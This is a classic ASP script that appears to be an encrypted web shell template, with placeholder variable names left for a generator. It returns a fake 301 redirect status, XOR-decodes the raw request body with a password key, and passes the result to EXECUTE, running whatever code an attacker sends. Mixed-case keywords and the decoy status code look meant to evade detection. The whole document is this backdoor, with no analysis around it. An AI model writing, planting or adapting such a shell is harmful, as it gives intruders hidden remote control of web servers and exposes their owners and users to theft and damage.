<%
ReSpoNse.Status = "301 Moved Permanently"
Response.CharSet = "UTF-8"
{stryi}="<<<PASSWORD>>>"
Session("{stryi}")={stryi}
{strer}=Request.TotalBytes
{strsan}=Request.BinaryRead({strer})
For {strliu}=1 To {strer}
{strsi} = AscB(MidB({strsan}, {strliu}, 1))
{strwu} = Asc(Mid({stryi}, ({strliu} And 15) + 1, 1))
{strba} = {strsi} Xor {strwu}
{strqi} = {strqi} & Chr({strba})
Next
EXECuTE({strqi})
%>